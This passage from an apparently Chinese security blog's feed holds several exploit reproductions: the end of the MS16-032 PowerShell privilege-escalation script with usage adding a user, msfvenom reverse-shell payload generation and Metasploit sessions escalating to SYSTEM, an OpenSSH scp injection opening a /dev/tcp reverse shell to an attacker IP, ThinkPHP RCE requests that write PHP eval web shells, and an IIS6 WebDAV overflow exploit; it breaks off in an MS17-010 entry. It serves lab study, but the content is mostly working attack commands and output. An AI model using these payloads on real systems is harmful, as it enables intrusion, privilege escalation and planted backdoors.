class="type">Kernel32</span>]::ResumeThread(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">            <span class="variable">$StartTokenRace</span>.Stop()</span><br><span class="line">            <span class="variable">$SafeGuard</span>.Stop()</span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Clean up suspended process</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::TerminateProcess(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hProcess)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Kill runspace &amp; stopwatch if edge-case</span></span><br><span class="line">        <span class="variable">$StartTokenRace</span>.Stop()</span><br><span class="line">        <span class="variable">$SafeGuard</span>.Stop()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行；</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">PS C:\Users\s\Desktop&gt;  . .\Invoke-MS16-<span class="number">032</span>.ps1</span><br><span class="line">PS C:\Users\s\Desktop&gt; Invoke-MS16-<span class="number">032</span></span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: <span class="number">2</span></span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got <span class="number">4</span> thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle <span class="keyword">list</span>:</span><br><span class="line"><span class="number">1256</span></span><br><span class="line"><span class="number">1052</span></span><br><span class="line"><span class="number">1852</span></span><br><span class="line"><span class="number">1424</span></span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line">……</span><br><span class="line"><span class="comment"># 执行系统命令</span></span><br><span class="line">PS C:\Users\s\Desktop&gt; Invoke-MS16-<span class="number">032</span> -Application cmd.exe -Commandline <span class="string">&quot;/c net user 1 1 /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建系统进程</span></span><br><span class="line">PS C:\Users\s\Desktop&gt; Invoke-MS16-<span class="number">032</span> -Application notepad.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211118192513071.png" alt="image-20211118192513071"></p>
<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>kali中执行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用msfvenom生成木马</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 13 -b <span class="string">&#x27;\x00\xfff\x0a&#x27;</span> lhost=192.168.220.130 --platform windows lport=4444 -f exe &gt;/root/test.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在msf下开启监听</span></span><br><span class="line">root@kali:/var/www/html/shell<span class="comment"># msfconsole</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.220.130</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取session后放置后台background</span></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-T4IO5PG1923\皮皮龙</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 exploit(multi/handler) &gt; use ms16_032_secondary_logon_handle_privesc</span><br><span class="line">[*] Using exploit/windows/<span class="built_in">local</span>/ms16_032_secondary_logon_handle_privesc</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/ms16_032_secondary_logon_handle_privesc) &gt; <span class="built_in">set</span> session 11 </span><br><span class="line">session =&gt; 11</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/ms16_032_secondary_logon_handle_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.220.138:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell</span><br><span class="line">[*] Writing payload file, C:\Users\safedog\AppData\Local\Temp\CtARDy.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3592</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">	 __ __ ___ ___   ___     ___ ___ ___ </span><br><span class="line">	|  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">	|     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">	|_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line">	                                    </span><br><span class="line">	               [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">[?] Done, using thread handle: 872</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 868</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">AajfqyEWS9GV4PhcRDucDZDy9ktl9zRf</span><br><span class="line">[+] Executed on target machine.</span><br><span class="line">[*] Sending stage (176195 bytes) to 192.168.220.130</span><br><span class="line">[*] Meterpreter session 12 opened (192.168.220.138:4444 -&gt; 192.168.220.130:49160) at 2021-11-18 01:03:44 -0500</span><br><span class="line">[+] Deleted C:\Users\safedog\AppData\Local\Temp\CtARDy.ps1</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211118193200665.png" alt="image-20211118193200665"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>参考：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032</a></p>
<p>参考：<a href="https://support.microsoft.com/zh-cn/topic/ms16-032-%E7%94%A8%E4%BA%8E%E4%BF%AE%E5%A4%8D%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%BE%85%E5%8A%A9%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F-2016-%E5%B9%B4-3-%E6%9C%88-8-%E6%97%A5-e73c1fa2-77ee-2c27-69eb-1b89afa3394f">https://support.microsoft.com/zh-cn/topic/ms16-032-%E7%94%A8%E4%BA%8E%E4%BF%AE%E5%A4%8D%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%BE%85%E5%8A%A9%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F-2016-%E5%B9%B4-3-%E6%9C%88-8-%E6%97%A5-e73c1fa2-77ee-2c27-69eb-1b89afa3394f</a></p>
]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
  <entry>
    <title>OpenSSH命令注入漏洞(CVE-2020-15778)</title>
    <url>/2021/12/07/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2020-15778)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>对于用户来说，ssh被阻止，但authorized_keys文件中的命令选项允许使用scp的情况。您可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到了ssh的用户密码，但是不允许ssh连接，或者ip等各种限制，可以尝试此漏洞进行利用。参考：<a href="https://www.hackliu.com/?p=468">https://www.hackliu.com/?p=468</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>OpenSSH &lt;=8.3p1</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：centos 7</p>
<p>靶机：kali2020</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp 1.txt root@ip:<span class="string">&#x27;`touch /root/test2.txt`/root/12111.txt&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207140844667.png" alt="image-20211207140844667"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp test.txt <span class="built_in">test</span>@ip:<span class="string">&#x27;`bash -i &gt;&amp; /dev/tcp/192.168.136.129/7777 0&gt;&amp;1`/tmp/test3.txt&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
  <entry>
    <title>ThinkPHP 5.x 远程命令执行漏洞</title>
    <url>/2021/12/07/ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。</p>
<ul>
<li>详情参考：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://blog.csdn.net/u010433704/article/details/103258291</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Thinkphp 5.x-Thinkphp 5.1.31</span><br><span class="line">Thinkphp 5.0.x&lt;=5.0.23</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="doker搭建"><a href="#doker搭建" class="headerlink" title="doker搭建"></a>doker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">受害机：centos-docker</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搭建</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">受害机：centos 7</span><br><span class="line">Thinkphp下载地址：http://www.thinkphp.cn/donate/download/id/1260.html</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建</span></span><br><span class="line">yum install httpd -y </span><br><span class="line">systemctl start httpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将thinkphp解压后上传至centos 7的/var/www/html目录下；</span></span><br></pre></td></tr></table></figure>

<p>浏览器访问：<a href="http://ip/thinkphp/public/index.php">http://IP/thinkphp/public/index.php</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207175327743.png" alt="image-20211207175327743"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="利用system函数远程命令执行"><a href="#利用system函数远程命令执行" class="headerlink" title="利用system函数远程命令执行"></a>利用system函数远程命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207180346982.png" alt="image-20211207180346982"></p>
<h3 id="通过phpinfo函数查看phpinfo-的信息"><a href="#通过phpinfo函数查看phpinfo-的信息" class="headerlink" title="通过phpinfo函数查看phpinfo()的信息"></a>通过phpinfo函数查看phpinfo()的信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207180448347.png" alt="image-20211207180448347"></p>
<h3 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h3><p><strong>姿势一：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>

<p>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不用引号(单引号、双引号),部分字符url编码不编码都行。</p>
<p><strong>姿势二：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php @eval($_POST[test]);?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>IIS6.0缓存区溢出漏洞(CVE-2017-7269)</title>
    <url>/2021/12/06/IIS6.0%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CVE-2017-7269)%20/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>IIS6.0开启Webdav服务的服务器被爆存在缓存区溢出漏洞导致远程代码随意执行，目前针对Windows Server 2003 R2 可以稳定利用。</p>
<p>参考：<a href="https://blog.csdn.net/Fly_hps/article/details/79568430">https://blog.csdn.net/Fly_hps/article/details/79568430</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS 6.0</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1.Windows Server 2003 R2镜像下载(迅雷):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ed2k://|file|cn_win_srv_2003_r2_enterprise_with_sp2_vl_cd1_X13-46432.iso|637917184|284DC0E76945125035B9208B9199E465|/</span><br></pre></td></tr></table></figure>

<p>2.安装IIS6.0</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206152509157.png" alt="image-20211206152509157"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206152546889.png" alt="image-20211206152546889"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206152624081.png" alt="image-20211206152624081"></p>
<p>3.开启webdav扩展，将“禁用”更改为”允许“；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206152938616.png" alt="image-20211206152938616"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206153049921.png" alt="image-20211206153049921"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Windows server 2003 R2版本IIS6.0的WebDAV服务中的ScStorgPathFromUrl函数存在缓冲区溢出漏洞，远程攻击者通过以“if:&lt;http://“开头的长header PROPFIND请求，执行任意代码。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.攻击机中使用nmap扫描一下靶机的端口情况，终端中执行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.220.141</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206154147094.png" alt="image-20211206154147094"></p>
<p>2.攻击机中下载cve-2017-7269攻击脚本，终端中执行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ianxtianxt/cve-2017-7269</span><br><span class="line"><span class="built_in">cd</span> cve-2017-7269</span><br><span class="line">mv cve-2017-7269.rb cve_2017_7269.rb</span><br><span class="line">cp cve_2017_7269.rb /usr/share/metasploit-framework/modules/exploits/windows/iis/</span><br></pre></td></tr></table></figure>

<p>3.利用msf攻击框架；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole </span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb:38: warning: key <span class="string">&quot;Platform&quot;</span> is duplicated and overwritten on line 48</span><br><span class="line">[!] The following modules were loaded with warnings:</span><br><span class="line">[!] 	/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">                                   .,,.                  .</span><br><span class="line">                                .\$$$$<span class="variable">$L</span>..,,==aaccaacc%<span class="comment">#s$b.       d8,    d8P</span></span><br><span class="line">                     d8P        <span class="comment">#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p</span></span><br><span class="line">                  d888888P      <span class="string">&#x27;7$$$$\&quot;&quot;&quot;&quot;&#x27;</span><span class="string">&#x27;^^`` .7$$$|D*&quot;&#x27;</span>```         ?88<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  d8bd8b.d8p d8888b ?88&#x27;</span> d888b8b            _.os<span class="comment">#$|8*&quot;`   d8P       ?8b  88P</span></span><br><span class="line">  88P`?P<span class="string">&#x27;?P d8b_,dP 88P d8P&#x27;</span> ?88       .oaS<span class="comment">###S*&quot;`       d8P d8888b $whi?88b 88b</span></span><br><span class="line"> d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*<span class="string">&quot; ?88,.d88b, d88 d8P&#x27; ?88 88P `?8b</span></span><br><span class="line"><span class="string">d88&#x27; d88b 8b`?8888P&#x27;`?8b`?88P&#x27;.aS$$$<span class="variable">$Q</span>*&quot;</span>`    `?88<span class="string">&#x27;  ?88 ?88 88b  d88 d88</span></span><br><span class="line"><span class="string">                          .a#$$$$$$&quot;`          88b  d8P  88b`?8888P&#x27;</span></span><br><span class="line">                       ,s$$$$$$$<span class="string">&quot;`             888888P&#x27;   88n      _.,,,ass;:</span></span><br><span class="line"><span class="string">                    .a$$$$$$<span class="variable">$P</span>`               d88P&#x27;    .,.ass%#S$$$$$$$$$$$$$$&#x27;</span></span><br><span class="line"><span class="string">                 .a<span class="variable">$#</span>##$$<span class="variable">$P</span>`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#x27;</span></span><br><span class="line"><span class="string">              ,a$<span class="variable">$#</span>##$<span class="variable">$P</span>`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$<span class="variable">$#</span>###SSSS&#x27;</span></span><br><span class="line"><span class="string">           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$<span class="variable">$SS</span>##==--&quot;</span><span class="string">&quot;&#x27;&#x27;^^/$$$$$$&#x27;</span></span><br><span class="line"><span class="string">_______________________________________________________________   ,&amp;$$$$$$&#x27;_____</span></span><br><span class="line"><span class="string">                                                                 ll&amp;&amp;$$$$&#x27;</span></span><br><span class="line"><span class="string">                                                              .;;lll&amp;&amp;&amp;&amp;&#x27;</span></span><br><span class="line"><span class="string">                                                            ...;;lllll&amp;&#x27;</span></span><br><span class="line"><span class="string">                                                          ......;;;llll;;;....</span></span><br><span class="line"><span class="string">                                                           ` ......;;;;... .  .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.99-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2046 exploits - 1106 auxiliary - 345 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit tip: Open an interactive Ruby terminal with irb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Starting persistent handler(s)...</span></span><br><span class="line"><span class="string">msf5 &gt; use exploit/windows/iis/cve_2017_7269 </span></span><br><span class="line"><span class="string">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf5 exploit(windows/iis/cve_2017_7269) &gt; set rhosts 192.168.220.141</span></span><br><span class="line"><span class="string">rhosts =&gt; 192.168.220.141</span></span><br><span class="line"><span class="string">msf5 exploit(windows/iis/cve_2017_7269) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/windows/iis/cve_2017_7269):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name                Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----                ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   HttpHost            localhost        yes       http host for target</span></span><br><span class="line"><span class="string">   PhysicalPathLength  19               yes       length of physical path for target(include backslash)</span></span><br><span class="line"><span class="string">   RHOSTS              192.168.220.141  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line"><span class="string">   RPORT               80               yes       The target port (TCP)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (windows/meterpreter/reverse_tcp):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name      Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----      ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span></span><br><span class="line"><span class="string">   LHOST     192.168.220.138  yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT     4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Microsoft Windows Server 2003 R2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 exploit(windows/iis/cve_2017_7269) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.220.138:4444 </span></span><br><span class="line"><span class="string">[*] Sending stage (176195 bytes) to 192.168.220.141</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.220.138:4444 -&gt; 192.168.220.141:1050) at 2021-12-06 02:56:19 -0500</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; </span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211206160152578.png" alt="image-20211206160152578"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>永恒之蓝漏洞利用(MS17-010)</title>
    <url>/2021/12/07/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8(MS17-010)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>操作系统漏洞，大家肯定听说过耳熟能详的永恒之蓝（MS17-010）了，他的爆发源于WannaCry勒索病毒的诞生。</p>
<p>参考：<a href="https://www.jianshu.com/p/4c92a9815dcc">https://www.jianshu.com/p/4c92a9815dcc</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Windows未装有ms17-010漏洞补丁的操作系统。</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：kali 2021</p>
<p>受害机：Windows 7</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.使用nmap的漏洞扫描功能;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.220.130</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207153716978.png" alt="image-20211207153716978"></p>
<p>2.使用metasploit的永恒之蓝漏洞扫描功能；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfconsole </span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb:38: warning: key <span class="string">&quot;Platform&quot;</span> is duplicated and overwritten on line 48</span><br><span class="line">[!] The following modules were loaded with warnings:</span><br><span class="line">[!] 	/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.</span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.</span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:</span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span></span><br><span class="line">  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo</span><br><span class="line">  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx</span><br><span class="line">  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl</span><br><span class="line">  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.</span><br><span class="line">   cOOOOOOO.MMM.OOc.MMMMM<span class="string">&#x27;oOO.MMM,OOOOOOOc</span></span><br><span class="line"><span class="string">    